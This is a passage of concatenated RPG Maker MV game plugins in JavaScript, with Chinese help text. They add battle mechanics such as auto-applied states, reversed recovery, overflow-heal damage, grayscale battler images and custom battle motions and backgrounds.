	const obj={hp:0,mp:0,tp:0,};
	m.set(ele,obj);
	if(ele===undefined){
		for(let x=0,dmgs=t._dmgLog;x!==dmgs.length;++x){
			obj.hp+=dmgs[x].dhp;
			obj.mp+=dmgs[x].dmp;
			obj.tp+=dmgs[x].dtp;
		}
	}else{
		for(let x=0,dmgs=t._dmgLog;x!==dmgs.length;++x){
			const r=this._calEleRatio(dmgs[x],ele);
			obj.hp+=dmgs[x].dhp*r;
			obj.mp+=dmgs[x].dmp*r;
			obj.tp+=dmgs[x].dtp*r;
		}
	}
	return obj[type]-this._getDmgLogBase(t,type,ele)||0;
};
p.getExeArr=function(s){
	return this.getExeLogger().get(s);
};
new cfc(p).add('getExeSum',function f(s,dataobj,type){
	const arr=this.getExeArr(s);
	const func=f.tbl[0][type];
	if(func && arr){
		if(!arr._byDataobj) arr._byDataobj=new Map();
		let precal=arr._byDataobj.get(dataobj); if(!precal){
			precal={hp:0,mp:0,tp:0,};
			for(let x=0,xs=arr.length;x!==xs;++x){ if(dataobj===arr[x].item){
				precal.hp+=arr[x].dhp;
				precal.mp+=arr[x].dmp;
				precal.tp+=arr[x].dtp;
			} }
		}
		return func(precal)||0;
	}else return 0;
},[
{
   hp:function(precal){
	return precal.hp;
 },mp:function(precal){
	return precal.mp;
 },tp:function(precal){
	return precal.tp;
 },
},
]);
}

{ const p=Game_Action.prototype;
k='executeDamage';
r=p[k]; (p[k]=function f(t){
	const hp=t.hp,mp=t.mp,tp=t.tp,bm=BattleManager;
	const acc=t.accumulateGains_init();
	const rtv=f.ori.apply(this,arguments);
	if(bm._phase) bm.logDmg(t,{
		dhp:-acc['gainHp'],
		dmp:-acc['gainMp'],
		dtp:-acc['gainTp'],
//		dhp:hp-t.hp,
//		dmp:mp-t.mp,
//		dtp:tp-t.tp,
		eles:this._lastAllEles,
		item:this.item(),
	},this.subject());
	t.accumulateGains_del();
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 角色、職業、武器、防具、怪物、可自動附加一些狀態
 * @author agold404
 * @help <autoState:id,more_id,...>
 * e.g. <autoState:2>
 * e.g. <autoState:2,3>
 * e.g. <autoState:2,3,>
 * e.g. <autoState:2,3,,>
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r; const gbb=Game_BattlerBase;
gbb.addEnum=window.addEnum;
gbb.addEnum('TRAIT_AUTOSTATE');

{ const p=gbb.prototype;
(p._addAddedTraitObjs_states=function f(rtv){
	if(!rtv._s) rtv._s=new Set(rtv);
	const resists=new Set(),added=[];
	rtv._statAdded=[];
	rtv._statResist=new Set();
	for(let x=0,xs=rtv._L||0;x!==xs;++x){
		for(let ti=0,tv=rtv[x].traits;ti!==tv.length;++ti){
			const func=f.tbl[tv[ti].code];
			if(func) func(rtv,tv[ti]);
		}
	}
	for(let x=0,arr=rtv._statAdded,xs=arr.length;x!==xs;++x){
		for(let ti=0,tv=arr[x].traits;ti!==tv.length;++ti){
			const func=f.tbl[tv[ti].code];
			if(func) func(rtv,tv[ti]);
		}
	}
	for(let x=0,arr=rtv._statAdded,xs=arr.length;x!==xs;++x){
		if(!rtv._statResist.has(arr[x].id)) rtv.push(arr[x]);
	}
	return rtv;
}).tbl=r=[]; for(let x=1e4;x--;) r[x]=undefined;
r[Game_BattlerBase.TRAIT_STATE_RESIST]=(rtv,trait)=>{
	rtv._statResist.add(trait.dataId);
};
r[Game_BattlerBase.TRAIT_AUTOSTATE]=(rtv,trait)=>{
	const stat=$dataStates[trait.dataId];
	if(stat && !rtv._s.has(stat)){
		rtv._s.add(stat);
		rtv._statAdded.push(stat);
	}
};

p._addAddedTraitObjs_nonDup=function(rtv){
	this._addAddedTraitObjs_states(rtv);
	return rtv;
};
p._addAddedTraitObjs_dup=rtv=>rtv;
p.addAddedTraitObjs=function(rtv){
	rtv._L=rtv.length;
	return this._addAddedTraitObjs_dup( this._addAddedTraitObjs_nonDup(rtv) );
};
p.states_added=function(){
	const rtv=this.traitObjects.ori.call(this);
	rtv._L=rtv.length;
	this._addAddedTraitObjs_states(rtv);
	return rtv.slice(rtv._L);
};
k='states';
r=p[k]; (p[k]=function f(){
	const rtv=this.states_ori();
	for(let x=0,arr=this.states_added(),xs=arr.length;x!==xs;++x) rtv.push(arr[x]);
	return rtv;
}).ori=r;
p.states_ori=r;
k='traitObjects';
r=p[k]; (p[k]=function(){
	return this.states_ori();
}).ori=r;
p[k].ori=p[k];
}

{ const p=Game_Actor.prototype;
r=p[k]; (p[k]=function f(){
	return this.addAddedTraitObjs(f.ori.apply(this,arguments));
}).ori=r;
}
{ const p=Game_Enemy.prototype;
r=p[k]; (p[k]=function f(){
	return this.addAddedTraitObjs(f.ori.apply(this,arguments));
}).ori=r;
}

{ const p=Scene_Boot.prototype;
const tune=dataobj=>{ if(!dataobj || !dataobj.traits) return;
	const meta=dataobj.meta; if(!meta) return;
	if(meta.autoState) meta.autoState.split(',').forEach(x=>{
		const n=Number(x)|0;
		if(n>0) dataobj.traits.push( {code: Game_BattlerBase.TRAIT_AUTOSTATE, dataId: n, value: 1} );
	});
};
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors.forEach(tune);
	$dataClasses.forEach(tune);
	$dataWeapons.forEach(tune);
	$dataArmors.forEach(tune);
	$dataEnemies.forEach(tune);
	//$dataStates.forEach(tune);
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc ㄏㄏyepㄏㄏ
 * @author agold404
 * @help ㄏ
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r;

if(typeof Yanfly!=='undefined'){ if(Yanfly.ATB!==undefined){ Yanfly.ATB.Window_BattleStatus_drawBasicArea=function(rect, actor){
	const minIconArea = Window_Base._iconWidth * 2;
	// lazy. zzzz...
	const nameLength = this.__fc===Graphics.frameCount?this.__nl:(this.__nl=Math.max.apply(null,$gameParty.members().map(a=>this.textWidth(a.name()))) + 6);
	this.__fc=Graphics.frameCount;
	const iconWidth = Math.max(rect.width - nameLength, minIconArea);
	const nameWidth = rect.width - iconWidth;
	this.drawActorName(actor, rect.x + 0, rect.y, nameWidth);
	this.drawActorIcons(actor, rect.x + nameLength, rect.y, iconWidth);
}; } }

})();


﻿"use strict";
/*:
 * @plugindesc ㄏㄏㄏyepㄏㄏㄏ
 * @author agold404
 * @help ㄏㄏ
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r;

{ const p=Scene_Battle.prototype;
k='updateWindowPositions';
r=p[k]; (p[k]=function f(){
	f.ori.apply(this,arguments);
	const ew=this._enemyWindow;
	ew.y=-512;
}).ori=r;
}

{ const p=Window_BattleEnemy.prototype;
k='maxPageRows';
r=p[k]; (p[k]=function f(){
	return 1;
}).ori=r;
k='sortTargets';
r=p[k]; (p[k]=function f(){
	this._enemies.sort(f.cmp);
}).ori=r;
p[k].cmp=(a,b)=>a.spritePosX() === b.spritePosX() ? a.spritePosY() - b.spritePosY() : b.spritePosX() - a.spritePosX();
k='cursorRight';
r=p[k]; (p[k]=function f(){
	return this.cursorLeft.ori.apply(this,arguments);
}).ori=r;
k='cursorLeft';
r=p[k]; (p[k]=function f(){
	return this.cursorRight.ori.apply(this,arguments);
}).ori=r;
k='cursorUp';
r=p[k]; (p[k]=function f(wrap){
	return this.cursorRight(wrap);
}).ori=r;
k='cursorDown';
r=p[k]; (p[k]=function f(wrap){
	return this.cursorLeft(wrap);
}).ori=r;
}

if(window.Yanfly && Yanfly.Core && Yanfly.Core.Sprite_Battler_updateSelectionEffect){ const p=Sprite_Battler.prototype;
k='updateSelectionEffect';
r=p[k]; (p[k]=function(){
	if (this._battler.isActor()) {
		Yanfly.Core.Sprite_Battler_updateSelectionEffect.call(this);
	} else {
		if(this._battler.isSelected()){
			if(this._lastSel!==this._battler || !this._effectDuration){
				this._lastSel=this._battler;
				this.startEffect('whiten');
			}
		}
	}
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 加在戰鬥時的虛擬角色身上的狀態
 * @author agold404
 * @help ????
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Battle.prototype;
k='createAllWindows';
r=p[k]; (p[k]=function f(){
	f.ori.apply(this,arguments);
	let bm=BattleManager,p=this,idx=(this.children.indexOf(this._windowLayer)+1||1)-1,wp,wt;
	p.addChildAt(wt=this._fieldStateWindowT=new Window_Help(1),idx);
	p.addChildAt(wp=this._fieldStateWindowP=new Window_Help(1),idx);
	wp.x=Graphics._boxWidth-(wt.width=wp.width=Graphics._boxWidth>>1);
	bm._fieldStateWindowP=wp;
	bm._fieldStateWindowT=wt;
	wp._actor=bm._actorP;
	wt._actor=bm._actorT;
	wp.update=wt.update=f.update;
	wp.refresh=wt.refresh=f.refresh;
	wp.setBackgroundType(2);
	wt.setBackgroundType(2);
	wp.y-=wp.standardPadding()-2;
	wt.y-=wt.standardPadding()-2;
}).ori=r;
(p[k].update=function f(){
	const stats=this._actor.states(),turns=stats.map(f.forEach,this._actor);
	if(!stats.equals(this._lastStates)||!this._lastTurns.equals(turns)){
		this._needRefresh=true;
		this._lastStates=stats;
		this._lastTurns=turns;
		this.refresh();
	}
}).forEach=function(stat){ return this.stateTurns(stat.id); };
p[k].refresh=function(){
	if(this._needRefresh && this._actor){
		this._needRefresh=false;
		this.contents.clear();
		const w=this._actor.allIcons().length*Window_Base._iconWidth;
		this.drawActorIcons(this._actor,this.textPadding()+((this.contentsWidth()-w)>>1),0,w);
	}
};
}

{ const p=BattleManager;
k='endBattle';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this.endBattle_clearFieldsData();
	return rtv;
}).ori=r;
k='endBattle_clearFieldsData';
r=p[k]; (p[k]=function f(){
	this._actorP=this._actorT=this._fieldStates=undefined;
	return this;
}).ori=r;
k='allBattleMembers';
r=p[k]; if(0)(p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this._actorP) rtv.push(this._actorP);
	if(this._actorT) rtv.push(this._actorT);
	return rtv;
}).ori=r;
k='endTurn';
r=p[k]; (p[k]=function f(){
	if(this._actorP){
		this._actorP.updateStateTurns();
		this._actorP.clearResult();
	}
	if(this._actorT){
		this._actorT.updateStateTurns();
		this._actorT.clearResult();
	}
	return f.ori.apply(this,arguments);
}).ori=r;
(p._initStatesAdded=function f(){
	if(!this._phase||f.tbl.has(this._phase)) return [];
	if(!this._fieldStates){
		const actorP=this._actorP=Object.create(Game_Actor.prototype) , actorT=this._actorT=Object.create(Game_Actor.prototype);
		actorP._virtual=actorT._virtual=true;
		if(actorP.states.ori) actorP.states=actorT.states=actorP.states.ori;
		actorP.initialize(1);
		actorT.initialize(1);
		this._fieldStates=new Map([
			[$gameParty,actorP],
			[$gameTroop,actorT],
		]);
		actorP._name=actorT._name='';
		actorP._virtual=actorT._virtual=true;
	}
}).tbl=new Set([
	'battleEnd',
	'start',
]);
p.actorStatesAdded=function(btlr){
	return this._fieldStates&&this._fieldStates.get(btlr.friendsUnit());
};
p.getStatesAdded=function(btlr){
	return this._initStatesAdded() || this.actorStatesAdded(btlr).states();
};
p.addStatesAdded=function(btlr,stateId){
	return !this._initStatesAdded() && this.actorStatesAdded(btlr).addState(stateId);
};
p.delStatesAdded=function(btlr,stateId){
	return !this._initStatesAdded() && this.actorStatesAdded(btlr).removeState(stateId);
};
}

new cfc(Scene_Title.prototype).add('initialize',function f(){
	if(SceneManager._scene instanceof Scene_Gameover) BattleManager.endBattle_clearFieldsData();
	return f.ori.apply(this,arguments);
});

{ const p=Game_Battler.prototype;
k='initialize';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	if(!this.hasOwnProperty('_virtual')) this._virtual=false;
	return rtv;
}).ori=r;
k='traitObjects';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	if(!this._virtual) BattleManager.getStatesAdded(this).forEach(f.forEach,rtv);
	return rtv;
}).ori=r;
p[k].forEach=function(stat){ this.push(stat); };
k='isStateAddable';
r=p[k]; (p[k]=function f(id){
	if(!this._virtual && $dataStates[id].meta.field){
		const actor=BattleManager.actorStatesAdded(this);
		return actor&&actor.isStateAddable(id)||false;
	}else return f.ori.apply(this,arguments);
}).ori=r;
k='addState';
r=p[k]; (p[k]=function f(id){
	if(!this._virtual && $dataStates[id].meta.field){
		const actor=BattleManager.actorStatesAdded(this);
		if(actor) return actor.addState(id);
	}else return f.ori.apply(this,arguments);
}).ori=r;
if(0){ // no, not removed by members
k='removeState';
r=p[k]; (p[k]=function f(id){
	if(!this._virtual && $dataStates[id].meta.field){
		const actor=BattleManager.actorStatesAdded(this);
		if(actor) return actor.removeState(id);
	}else return f.ori.apply(this,arguments);
}).ori=r;
}
}

})();


﻿﻿"use strict";
/*:
 * @plugindesc runtime 調整圖片
 * @author agold404
 * @help ????
 * 灰階: 狀態<grayscale:灰階程度,rgb偏向,偏向程度>
 * *灰階程度: 0~1 ，跟原本的顏色線性比例
 * *rgb偏向: [紅色0到255,綠色0到255,藍色0到255] ，灰階後與此顏色加權平均
 * *偏向程度: 0~1 ，偏向的權重
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const tuneN=(n,meta)=>{
	const uqh=ImageManager.splitUrlQueryHash(n);
	uqh[1]+=(uqh[1]?"&":"?")+"grayscale";
	if(meta.grayscale!==true) uqh[1]+='='+encodeURIComponent(meta.grayscale);
	return uqh.join('');
};

{ const p=Game_Battler.prototype;
(p._battlerName_grayscalize=function f(n){
	const stat=this.states().find(f.forEach);
	if(stat && n) n=tuneN(n,stat.meta);
	return n;
}).forEach=stat=>stat.meta.grayscale;
}

{ const p=Game_Event.prototype;
p._characterName_grayscalize=function f(n){
	const data=this.event();
	if(data && data.meta.grayscale && n) n=tuneN(n,data.meta);
	return n;
};
k='characterName';
r=p[k]; (p[k]=function f(){
	return this._characterName_grayscalize(f.ori.apply(this,arguments));
}).ori=r;
}

k='battlerName';
{ const p=Game_Actor.prototype;
r=p[k]; (p[k]=function f(){
	return this._battlerName_grayscalize(f.ori.apply(this,arguments));
}).ori=r;
}
{ const p=Game_Enemy.prototype;
r=p[k]; (p[k]=function f(){
	return this._battlerName_grayscalize(f.ori.apply(this,arguments));
}).ori=r;
}

k='svBattlerName';
{ const p=Game_Enemy.prototype;
if(p[k]) new cfc(p).add(k,function f(){
    return this._battlerName_grayscalize(f.ori.apply(this,arguments));
});
}

{ const p=ImageManager;
(p._parseQs_uqh=function f(uqh,idx){
	idx=idx===undefined?1:idx;
	const rtv={};
	if(uqh&&uqh[idx]) uqh[idx].slice(1).split("&").forEach(f.forEach,rtv);
	return rtv;
}).forEach=function(x){
	const idxe=x.indexOf('=');
	if(idxe===-1) this[x]=true;
	else this[x.slice(0,idxe)]=decodeURIComponent(x.slice(idxe+1));
};
p._parseQs=function(path){
	return this._parseQs_uqh(ImageManager.splitUrlQueryHash(path),1);
};
p._parseHs=function(path){
	return this._parseQs_uqh(ImageManager.splitUrlQueryHash(path),2);
};
/*
k='loadBitmap';
r=p[k]; (p[k]=function f(){ // (folder, filename, hue, smooth)
	//if(arguments[1]){ const idx_sharp=arguments[1].indexOf("#"); if(idx_sharp>=0) arguments[1]=arguments[1].slice(0,idx_sharp); }
	const idx=arguments[1]&&arguments[1].indexOf("?")+1;
	if(idx){
		const path = arguments[0] + arguments[1].slice(0,idx-1) + '.png';
		const bitmap = this.loadNormalBitmap(path + arguments[1].slice(idx-1), arguments[2] || 0);
		bitmap.smooth = arguments[3];
		return bitmap;
	}else return f.ori.apply(this,arguments);
}).ori=r;
k='reserveBitmap';
r=p[k]; (p[k]=function f(){ // (folder, filename, hue, smooth, reservationId)
	const idx=arguments[1]&&arguments[1].indexOf("?")+1;
	if(idx){
		const path = arguments[0] + arguments[1].slice(0,idx-1) + '.png';
		const bitmap = this.reserveNormalBitmap(path + arguments[1].slice(idx-1), arguments[2] || 0, arguments[4] || this._defaultReservationId);
		bitmap.smooth = arguments[3];
		return bitmap;
	}else return f.ori.apply(this,arguments);
}).ori=r;
*/
k='loadNormalBitmap';
r=p[k]; (p[k]=function f(){ // (path, hue)
	const uqh=ImageManager.splitUrlQueryHash(arguments[0]);
	if(uqh[1]){
		const key = this._generateCacheKey(arguments[0], arguments[1]);
		let bitmap = this._imageCache.get(key);
		if(!bitmap){
			const bitmap_base=this.loadNormalBitmap(uqh[0],arguments[1]);
			bitmap=new Bitmap(1,1);
			bitmap._baseBitmap=bitmap_base;
			bitmap._loadingState='';
			bitmap_base.addLoadListener(bm=>{
				const w=bm.width,h=bm.height;
				const c=document.createElement('canvas'); c.width=w; c.height=h;
				const ctx=c.getContext('2d');
				const args=this._parseQs_uqh(uqh);
				ctx.globalCompositeOperation='copy';
				ctx.drawImage(bm._canvas,0,0);
				if(args.grayscale){
					const grayscale=JSON.parse('['+args.grayscale+']');
					const grayRate=grayscale[0], toColor=grayscale[1] , toColorRate=grayscale[2];
					const tmp=ctx.getImageData(0,0,w,h);
					for(let x=0,xs=w*h<<2,gsc=1-grayRate;x!==xs;x+=4){
						let sum=0;
						for(let c=0;c!==3;++c) sum+=tmp.data[x+c];
						for(let c=0,v=grayRate*~~(sum/3);c!==3;++c) tmp.data[x+c]=tmp.data[x+c]*gsc+v;
					}
					if(!isNaN(toColorRate)){
						for(let x=0,xs=w*h<<2,tcrc=1-toColorRate;x!==xs;x+=4){
							for(let c=0;c!==3;++c) tmp.data[x+c]=tmp.data[x+c]*tcrc+toColorRate*toColor[c];
						}
					}
					ctx.putImageData(tmp,0,0);
				}
				bitmap.resize(w,h);
				bitmap.clear();
				bitmap.bltImage({width:w,height:h,_image:ctx.canvas},0,0,w,h,0,0);
				bitmap._loadingState='loaded';
			});
			this._imageCache.add(key, bitmap);
		}else if(!bitmap.isReady()){
			if(bitmap._baseBitmap) bitmap._baseBitmap.decode();
			else{ bitmap.decode(); bitmap._loadingState='loaded'; }
		}
		return bitmap;
	}else return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 狀態指定動作
 * @author agold404
 * @help ????
 * 狀態<motionIndex:哪一組圖> 會自動循環撥放
 * 狀態<motionIndex:哪一組圖,固定哪一張0到2> 會固定那張圖，不循環撥放
 * 	 0	 6	12
 * 	 1	 7	13
 * 	 2	 8	14
 * 	 3	 9	15
 * 	 4	10	16
 * 	 5	11	17
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Battler.prototype;
(p.customMotion=function f(){
	const stat=this.states().find(f.forEach);
	if(stat) return stat.meta.motionIndex.split(',');
}).forEach=stat=>stat.meta.motionIndex;
}

{ Sprite_Actor.MOTIONS.custom={
	index:0,
	loop:true,
}; for(let av=[Sprite_Enemy,Sprite_Actor,],x=av.length;x--;){
new cfc(av[x].prototype).add('updateMotionCount',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this._motion===Sprite_Actor.MOTIONS.custom && this._custom_pattern>=0){
		this._pattern=this._custom_pattern;
	}
	return rtv;
}).add('refreshMotion',function f(){
	if(this._actor){ const cm=this._actor.customMotion(); if(cm){
		this._motion=Sprite_Actor.MOTIONS.custom;
		this._custom_index=Number(cm[0]);
		this._custom_pattern=cm[1]?Number(cm[1]):-1;
		if(this._custom_index>=0) return;
	} }
	return f.ori.apply(this,arguments);
}).add('updateFrame',function f(){
	if(this._motion===Sprite_Actor.MOTIONS.custom) this._motion.index=this._custom_index;
	return f.ori.apply(this,arguments);
});
} }

})();


﻿"use strict";
/*:
 * @plugindesc 反效恢復
 * @author agold404
 * @help <revRec__>
 * 全反向
 * <revRecHp>
 * <revRecMp>
 * <revRecTp>
 * 僅道具
 * <revRecHp:i>
 * <revRecMp:i>
 * <revRecTp:i>
 * 僅技能
 * <revRecHp:s>
 * <revRecMp:s>
 * <revRecTp:s>
 *
 * // hp:1 ; mp:2 ; tp:3
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;
gbb.addEnum=window.addEnum;
gbb.addEnum('TRAIT_REVREC');

{ const p=gbb.prototype;
// type:  1:dmg  2:item
p.revRecHp=function(type){
	return this.traitsSum(Game_BattlerBase.TRAIT_REVREC,(type<<2)|1);
};
p.revRecMp=function(type){
	return this.traitsSum(Game_BattlerBase.TRAIT_REVREC,(type<<2)|2);
};
p.revRecTp=function(type){
	return this.traitsSum(Game_BattlerBase.TRAIT_REVREC,(type<<2)|3);
};
}

{ const p=Game_Action.prototype;
p.toRevRecType=function(){
	if(this.isItem()) return 2;
	if(this.isSkill()) return 1;
};
k='testApply';
r=p[k]; (p[k]=function f(target){
	return (
		( this.is_ignoreIfDead() || this.isForDeadFriend() === target.isDead() ) && // effect to deads only on friends
		(
			$gameParty.inBattle() || this.isForOpponent() ||
			(this.isHpRecover() && ( target.hp < target.mhp || target.revRecHp(this.toRevRecType()) )) ||
			(this.isMpRecover() && ( target.mp < target.mmp || target.revRecHp(this.toRevRecType()) )) ||
			this.hasItemAnyValidEffects(target)
		)
	);
}).ori=r;
k='executeHpDamage';
r=p[k]; (p[k]=function f(){
	if( arguments[0] && arguments[1]<0 && this.isRecover() && arguments[0].revRecHp(this.toRevRecType()) ) arguments[1]=-arguments[1];
	return f.ori.apply(this,arguments);
}).ori=r;
k='executeMpDamage';
r=p[k]; (p[k]=function f(){
	if( arguments[0] && arguments[1]<0 && this.isRecover() && arguments[0].revRecMp(this.toRevRecType()) ) arguments[1]=-arguments[1];
	return f.ori.apply(this,arguments);
}).ori=r;
p._itemEffectRecover_toRev=e=>({value1:-e.value1,value2:-e.value2});
k='itemEffectRecoverHp';
r=p[k]; (p[k]=function f(){
	if(arguments[0] && arguments[0].revRecHp(this.toRevRecType())) arguments[1]=this._itemEffectRecover_toRev(arguments[1]);
	return f.ori.apply(this,arguments);
}).ori=r;
k='itemEffectRecoverMp';
r=p[k]; (p[k]=function f(){
	if(arguments[0] && arguments[0].revRecMp(this.toRevRecType())) arguments[1]=this._itemEffectRecover_toRev(arguments[1]);
	return f.ori.apply(this,arguments);
}).ori=r;
k='itemEffectRecoverTp';
r=p[k]; (p[k]=function f(){
	if(arguments[0] && arguments[0].revRecTp(this.toRevRecType())) arguments[1]=this._itemEffectRecover_toRev(arguments[1]);
	return f.ori.apply(this,arguments);
}).ori=r;
}

{ const p=Scene_Boot.prototype;
const getTypes=metaProperty=>{
	switch(metaProperty){
	default:
	case true: return [0,1,2];
	case 's': return [0,1];
	case 'i': return [0,2];
	}
};
const tune=dataobj=>{ if(!dataobj || !dataobj.traits) return;
	const meta=dataobj.meta; if(!meta) return;
	['','revRecHp','revRecMp','revRecTp'].forEach((k,i)=>{ if(i&&meta[k]){
		getTypes(meta[k]).forEach(x=>dataobj.traits.push(
			{code: Game_BattlerBase.TRAIT_REVREC, dataId: (x<<2)|i, value: 1}
		));
	} });
};
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors.forEach(tune);
	$dataClasses.forEach(tune);
	$dataWeapons.forEach(tune);
	$dataArmors.forEach(tune);
	$dataEnemies.forEach(tune);
	$dataStates.forEach(tune);
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 狀態:補超過會扣回來
 * @author agold404
 * @help in note: <overflowDamage>
 * on traitObjects:
 * <overflowDamage:rate_default_1_multiple_use_plus>
 * 
 * on skill or item: it will have the ability to do so
 * <overflowDamage:rate_default_1_multiple_use_plus>
 * 
 * example:
 * <overflowDamage>
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t;

const gbb=Game_BattlerBase,kwp='overflowDamage',kw=kwp+'';
const kwt='TRAIT_'+kw;
const kwget="get_"+kw;
const kwmain="is_"+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kwt).
	addEnum('__END__');

const bit_hp=1,bit_mp=2,bit_tp=4;
const bits_all=bit_hp|bit_mp|bit_tp;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors .forEach(f.tbl[0]);
	$dataClasses.forEach(f.tbl[0]);
	$dataWeapons.forEach(f.tbl[0]);
	$dataArmors .forEach(f.tbl[0]);
	$dataStates .forEach(f.tbl[0]);
	$dataEnemies.forEach(f.tbl[0]);
	$dataSkills.forEach(f.tbl[1]);
	$dataItems.forEach(f.tbl[1]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
(dataobj)=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta[kw]){
		const val=meta[kw]-0;
		if(val) dataobj.traits.push({code:gbb[kwt],dataId:bits_all,value:val});
	}
},
(dataobj)=>{ if(!dataobj) return; const meta=dataobj.meta; meta[kw]=meta[kw]-0;},
];
}

{ const p=Game_Battler.prototype;
k=kwget;
r=p[k]; (p[k]=function f(){
	return this.traits(gbb[kwt]);
}).ori=r;
k=kwmain;
r=p[k]; (p[k]=function f(filterMsk){
	if(filterMsk===undefined) filterMsk=f.tbl[1];
	const arr=this[f.tbl[0]]().filter(f.tbl[2],filterMsk);
	return (arr.length?arr.reduce(f.tbl[3],0):0)+(this._overflowDmg_item||0);
}).ori=r;
p[k].tbl=[
kwget,
bits_all,
function(t){ return this&t.dataId; },
(r,n)=>r+n.value,
];

t=[kwmain,kw,];
new cfc(p).add('gainHp_merged',function f(val){
	if(val>0){ const odr=this[f.tbl[0]](); if(odr>0){
		const overflow=(this._hp+val-this.mhp)*odr;
		if(overflow>0) return f.call(this,-overflow);
	} }
	return f.ori.apply(this,arguments);
},t).add('gainMp_merged',function f(val){
	if(val>0){ const odr=this[f.tbl[0]](); if(odr>0){
		const overflow=(this._mp+val-this.mmp)*odr;
		if(overflow>0) return f.call(this,-overflow);
	} }
	return f.ori.apply(this,arguments);
},t).add('gainTp_merged',function f(val){
	if(val>0){ const odr=this[f.tbl[0]](); if(odr>0){
		const overflow=(this._tp+val-this.maxTp())*odr;
		if(overflow>0) return f.call(this,-overflow);
	} }
	return f.ori.apply(this,arguments);
},t);
}

{ const p=Game_Action.prototype;
k='testApply_deadState';
r=p[k]; (p[k]=function f(trgt){
	return this.is_ignoreIfDead() || this.isForDeadFriend() === trgt.isDead();
}).ori=r;
k='testApply_effective';
r=p[k]; (p[k]=function f(trgt){
	const item=this.item();
	return (item && item.meta[f.tbl[1]]) || ( trgt[f.tbl[0]]() ||
		(this.isHpRecover() && ( trgt.hp < trgt.mhp || trgt.revRecHp(this.toRevRecType()) )) ||
		(this.isMpRecover() && ( trgt.mp < trgt.mmp || trgt.revRecHp(this.toRevRecType()) )) ||
		this.hasItemAnyValidEffects(trgt)
		);
}).ori=r;
p[k].tbl=t;
k='testApply';
r=p[k]; (p[k]=function f(target){
	return (
		this.testApply_deadState(target) && // effect to deads only on friends
		(
			$gameParty.inBattle() || this.isForOpponent() ||
			this.testApply_effective(target)
		)
	);
}).ori=r;
k='executeDamage';
r=p[k]; (p[k]=function f(trgt,val){
	const item=this.item();
	trgt._overflowDmg_item=item&&item.meta[f.tbl[1]];
	const rtv=f.ori.apply(this,arguments);
	trgt._overflowDmg_item=undefined;
	return rtv;
}).ori=r;
p[k].tbl=t;
}

})();


﻿"use strict";
/*:
 * @plugindesc 選擇該角色行動時稍微位移battlehub
 * @author agold404
 * @help ????
 * 
 * This plugin can be renamed as you want.
 */

if(typeof Battle_Hud!=='undefined')(()=>{ let k,r,t;

{ const p=Battle_Hud.prototype;
k='update';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const dx=-(this._active<<4); if(this.x!==dx) this.x=dx;
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc WTF R U DOING?
 * @author agold404
 * @help ????
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Sprite_Enemy.prototype;
k='initVisibility';
r=p[k]; (p[k]=function f(){
	if(!this._battlerName){
		this._lastInitedBattlerName=this._battlerName;
		return f.ori.apply(this,arguments);
	}
	const uqh=ImageManager.splitUrlQueryHash(this._battlerName);
	if(this._lastInitedBattlerName!==uqh[0]){
		this._lastInitedBattlerName=uqh[0];
		return f.ori.apply(this,arguments);
	}
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc alter battle back
 * @author agold404
 * @help
 * <battleBack1:{"tileType":filename_without_ext}>
 * <battleBack2:{"tileType":filename_without_ext}>
 * 
 * tileType: (tileId-2048)//48
 * 
 * <battleBack2:{"1":"aaaa"}>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Spriteset_Battle.prototype;
t={a:'terrainBattleback',b:'Name',};
k=t.a+1+t.b;
r=p[k]; (p[k]=function f(){
	const tset = $dataMap && $dataTilesets[$dataMap.tilesetId];
	const arr = tset && tset.meta.battleBack1 && JSON.parse(tset.meta.battleBack1);
	return arr&&arr[arguments[0]]||f.ori.apply(this,arguments);
}).ori=r;
k=t.a+2+t.b;
r=p[k]; (p[k]=function f(){
	const tset = $dataMap && $dataTilesets[$dataMap.tilesetId];
	const arr = tset && tset.meta.battleBack2 && JSON.parse(tset.meta.battleBack2);
	return arr&&arr[arguments[0]]||f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
